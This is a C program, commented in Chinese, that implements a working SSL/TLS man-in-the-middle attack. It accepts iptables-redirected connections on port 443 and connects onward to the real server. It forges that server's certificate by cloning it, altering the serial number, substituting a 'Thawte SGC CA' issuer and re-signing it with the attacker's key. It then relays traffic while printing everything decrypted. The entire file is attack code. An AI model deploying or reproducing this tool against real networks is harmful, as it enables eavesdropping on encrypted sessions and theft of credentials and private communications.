
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/param.h>
#include <linux/netfilter_ipv4.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/time.h>

#include <openssl/ssl.h>
#include <openssl/err.h>

#define LISTEN_BACKLOG 50

#define warning(msg) \
    do { fprintf(stderr, "%d, ", sum); perror(msg); } while(0)

#define error(msg) \
    do { fprintf(stderr, "%d, ", sum); perror(msg); exit(EXIT_FAILURE); } while (0)

int sum = 1;
struct timeval timeout = { 0, 10000000 };

void ShowCerts(SSL * ssl) 
{
    X509 * cert;
    char * line;
    cert = SSL_get_peer_certificate(ssl);
    if (cert != NULL) 
    {
        printf("数字证书信息:\n");
        line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
        printf("证书: %s\n", line);
        free(line);
        line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
        printf("颁发者: %s\n", line);
        free(line);
        X509_free(cert);
    } 
    else 
    {
        printf("无证书信息！\n");
    }
} 

int get_socket_to_server(struct sockaddr_in* original_server_addr) 
{
    int sockfd;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        error("Fail to initial socket to server!");
    } 
    if (connect(sockfd, (struct sockaddr*) original_server_addr, sizeof(struct sockaddr)) < 0)
    {
        error("Fail to connect to server!");
    } 
    printf("%d, Connect to server [%s:%d]\n", sum, inet_ntoa(original_server_addr->sin_addr), ntohs(original_server_addr->sin_port));
    return sockfd;
}

//监听指定端口，等待客户端的连接
int socket_to_client_init(short int port) 
{
    int sockfd;
    int on = 1;
    struct sockaddr_in addr;
    //初始化一个socket
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        error("Fail to initial socket to client!");
    }         
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (char *) &on, sizeof(on)) < 0)
    {
        error("reuseaddr error!");
    }  
    memset(&addr, 0, sizeof(addr));
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_family = AF_INET;
    //将该socket绑定到8888端口上
    addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr*) &addr, sizeof(struct sockaddr)) < 0) 
    {
        shutdown(sockfd, SHUT_RDWR);
        error("Fail to bind socket to client!");
    }
    //然后监听该端口
    if (listen(sockfd, LISTEN_BACKLOG) < 0) 
    {
        shutdown(sockfd, SHUT_RDWR);
        error("Fail to listen socket to client!");
    }

    return sockfd;
}

/*
当主机B发起一个SSL连接时，我们在本地8888端口就可以监听到连接，这时我们接受这个连接，并获得该链接的原始目的地址，
以便后续连接服务器时使用。该部分封装到了get_socket_to_client函数中。
*/
int get_socket_to_client(int socket, struct sockaddr_in* original_server_addr) 
{
    int client_fd;
    struct sockaddr_in client_addr;
    socklen_t client_size = sizeof(struct sockaddr);
    socklen_t server_size = sizeof(struct sockaddr);

    memset(&client_addr, 0, client_size);
    memset(original_server_addr, 0, server_size);
    client_fd = accept(socket, (struct sockaddr *) &client_addr, &client_size);
    if (client_fd < 0)
    {
        warning("Fail to accept socket to client!");
        return -1;
    }
    /*
    通过getsockopt函数获得socket中的SO_ORIGINAL_DST属性，得到报文被iptables重定向之前的原始目的地址。
    使用SO_ORIGINAL_DST属性需要包括头文件<linux/netfilter_ipv4.h>。
    值得注意的是，在当前的情景下，通过getsockname等函数是无法正确获得原始的目的地址的，
    因为iptables在重定向报文到本地端口时，已经将IP报文的目的地址修改为本地地址，
    所以getsockname等函数获得的都是本地地址而不是服务器的地址。
    */
    if (getsockopt(client_fd, SOL_IP, SO_ORIGINAL_DST, original_server_addr, &server_size) < 0) 
    {
        warning("Fail to get original server address of socket to client!");;
    }
    printf("%d, Find SSL connection from client [%s:%d]", sum, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
    printf(" to server [%s:%d]\n", inet_ntoa(original_server_addr->sin_addr), ntohs(original_server_addr->sin_port));

    return client_fd;
}

// 初始化openssl库
void SSL_init() 
{
    SSL_library_init();
    SSL_load_error_strings();
}

void SSL_Warning(char *custom_string) {
    char error_buffer[256] = { 0 };

    fprintf(stderr, "%d, %s ", sum, custom_string);
    ERR_error_string(ERR_get_error(), error_buffer);
    fprintf(stderr, "%s\n", error_buffer);
}

void SSL_Error(char *custom_string) {
    SSL_Warning(custom_string);
    exit(EXIT_FAILURE);
}

//在与服务器建立了socket连接之后，我们就可以建立SSL连接了。这里我们使用linux系统中著名的SSL库openssl来完成我们的接下来的工作
SSL* SSL_to_server_init(int socket) 
{
    SSL_CTX *ctx;

    ctx = SSL_CTX_new(SSLv23_client_method());
    if (ctx == NULL)
    {
        SSL_Error("Fail to init ssl ctx!");
    } 
    SSL *ssl = SSL_new(ctx);
    if (ssl == NULL)
    {
        SSL_Error("Create ssl error");
    } 
    if (SSL_set_fd(ssl, socket) != 1)
    {
        SSL_Error("Set fd error");
    } 

    return ssl;
}

SSL* SSL_to_client_init(int socket, X509 *cert, EVP_PKEY *key) {
    SSL_CTX *ctx;

    ctx = SSL_CTX_new(SSLv23_server_method());
    if (ctx == NULL)
        SSL_Error("Fail to init ssl ctx!");
    if (cert && key) {
        if (SSL_CTX_use_certificate(ctx, cert) != 1)
            SSL_Error("Certificate error");
        if (SSL_CTX_use_PrivateKey(ctx, key) != 1)
            SSL_Error("key error");
        if (SSL_CTX_check_private_key(ctx) != 1)
            SSL_Error("Private key does not match the certificate public key");
    }

    SSL *ssl = SSL_new(ctx);
    if (ssl == NULL)
        SSL_Error("Create ssl error");
    if (SSL_set_fd(ssl, socket) != 1)
        SSL_Error("Set fd error");

    return ssl;
}

void SSL_terminal(SSL *ssl) {
    SSL_CTX *ctx = SSL_get_SSL_CTX(ssl);
    SSL_shutdown(ssl);
    SSL_free(ssl);
    if (ctx)
        SSL_CTX_free(ctx);
}


// 从文件读取伪造SSL证书时需要的RAS私钥和公钥
EVP_PKEY* create_key() 
{
    EVP_PKEY *key = EVP_PKEY_new();
    RSA *rsa = RSA_new();

    FILE *fp;
    if ((fp = fopen("private.key", "r")) == NULL)
    {
        error("private.key");
    } 
    PEM_read_RSAPrivateKey(fp, &rsa, NULL, NULL);
    
    if ((fp = fopen("public.key", "r")) == NULL)
    {
        error("public.key");
    } 
    PEM_read_RSAPublicKey(fp, &rsa, NULL, NULL);

    EVP_PKEY_assign_RSA(key,rsa);
    return key;
}

X509* create_fake_certificate(SSL* ssl_to_server, EVP_PKEY *key) 
{
    unsigned char buffer[128] = { 0 };
    int length = 0, loc;
    X509 *server_x509 = SSL_get_peer_certificate(ssl_to_server);
    X509 *fake_x509 = X509_dup(server_x509);
    if (server_x509 == NULL)
    {
        SSL_Error("Fail to get the certificate from server!"); 
    }
        
    X509_set_version(fake_x509, X509_get_version(server_x509));
    ASN1_INTEGER *a = X509_get_serialNumber(fake_x509);
    a->data[0] = a->data[0] + 1; 
    X509_NAME *issuer = X509_NAME_new(); 
    X509_NAME_add_entry_by_txt(issuer, "CN", MBSTRING_ASC,
            "Thawte SGC CA", -1, -1, 0);
    X509_NAME_add_entry_by_txt(issuer, "O", MBSTRING_ASC, "Thawte Consulting (Pty) Ltd.", -1, -1, 0);
    X509_NAME_add_entry_by_txt(issuer, "OU", MBSTRING_ASC, "Thawte SGC CA", -1,
            -1, 0);
    X509_set_issuer_name(fake_x509, issuer);  
    X509_sign(fake_x509, key, EVP_sha1()); 

    return fake_x509;
}

/*
我们将抓取数据的代码封装到transfer函数中。该函数主要是使用系统的select函数同时监听服务器和客户端，
并使用SSL_read和SSL_write不断的在两个信道之间传递数据，并将数据输出到控制台
*/
int transfer(SSL *ssl_to_client, SSL *ssl_to_server) 
{
    int socket_to_client = SSL_get_fd(ssl_to_client);
    int socket_to_server = SSL_get_fd(ssl_to_server);
    int ret;
    char buffer[4096] = { 0 };

    fd_set fd_read;

    printf("%d, waiting for transfer\n", sum);
    while (1) 
    {
        int max;

        FD_ZERO(&fd_read);
        FD_SET(socket_to_server, &fd_read);
        FD_SET(socket_to_client, &fd_read);
        max = socket_to_client > socket_to_server ? socket_to_client + 1 : socket_to_server + 1;

        ret = select(max, &fd_read, NULL, NULL, &timeout);
        if (ret < 0) 
        {
            SSL_Warning("Fail to select!");
            break;
        } 
        else if (ret == 0) 
        {
            continue;
        }
        if (FD_ISSET(socket_to_client, &fd_read)) 
        {
            memset(buffer, 0, sizeof(buffer));
            ret = SSL_read(ssl_to_client, buffer, sizeof(buffer));
            if (ret > 0) 
            {
                if (ret != SSL_write(ssl_to_server, buffer, ret)) 
                {
                    SSL_Warning("Fail to write to server!");
                    break;
                } 
                else 
                {
                    printf("%d, client send %d bytes to server\n", sum, ret);
                    printf("%s\n", buffer);
                }
            } 
            else 
            {
                SSL_Warning("Fail to read from client!");
                break;
            }
        }
        if (FD_ISSET(socket_to_server, &fd_read)) 
        {
            memset(buffer, 0, sizeof(buffer));
            ret = SSL_read(ssl_to_server, buffer, sizeof(buffer));
            if (ret > 0) {
                if (ret != SSL_write(ssl_to_client, buffer, ret)) 
                {
                    SSL_Warning("Fail to write to client!");
                    break;
                } 
                else 
                {
                    printf("%d, server send %d bytes to client\n", sum, ret);
                    printf("%s\n", buffer);
                }
            } 
            else 
            {
                SSL_Warning("Fail to read from server!");
                break;
            }
        }
    }
    return -1;
}

int main() 
{
    // 初始化一个socket，将该socket绑定到443端口，并监听
    int socket = socket_to_client_init(443);
    // 从文件读取伪造SSL证书时需要的RAS私钥和公钥
    EVP_PKEY* key = create_key();
    // 初始化openssl库
    SSL_init();

    while (1) 
    {
        struct sockaddr_in original_server_addr;
        // 从监听的端口获得一个客户端的连接，并将该连接的原始目的地址存储到original_server_addr中
        int socket_to_client = get_socket_to_client(socket, &original_server_addr);
        if (socket_to_client < 0)
        {
            continue;
        } 
        // 新建一个子进程处理后续事宜，主进程继续监听端口等待后续连接
        if (!fork()) 
        {
            X509 *fake_x509;
            SSL *ssl_to_client, *ssl_to_server;

            // 通过获得的原始目的地址，连接真正的服务器，获得一个和服务器连接的socket
            int socket_to_server = get_socket_to_server(&original_server_addr);
            // 通过和服务器连接的socket建立一个和服务器的SSL连接
            ssl_to_server = SSL_to_server_init(socket_to_server);
            if (SSL_connect(ssl_to_server) < 0)
            {
                SSL_Error("Fail to connect server with ssl!");
            } else {
                printf("Connected with %s encryption\n", SSL_get_cipher(ssl_to_server));
                ShowCerts(ssl_to_server);
            }
            printf("%d, SSL to server\n", sum);

            // 从服务器获得证书，并通过这个证书伪造一个假的证书
            fake_x509 = create_fake_certificate(ssl_to_server, key);
            // 使用假的证书和我们自己的密钥，和客户端建立一个SSL连接。至此，SSL中间人攻击成功
            ssl_to_client = SSL_to_client_init(socket_to_client, fake_x509, key);
            if (SSL_accept(ssl_to_client) <= 0)
            {
                SSL_Error("Fail to accept client with ssl!");
            } 
            printf("%d, SSL to client\n", sum);

            // 在服务器SSL连接和客户端SSL连接之间转移数据，并输出服务器和客户端之间通信的数据
            if (transfer(ssl_to_client, ssl_to_server) < 0)
            {
                break;
            } 
            printf("%d, connection shutdown\n", sum);
            shutdown(socket_to_server, SHUT_RDWR);
            SSL_terminal(ssl_to_client);
            SSL_terminal(ssl_to_server);
            X509_free(fake_x509);
            EVP_PKEY_free(key);
        } 
        else 
        {
            ++sum;
        }
    }

    return 0;
}
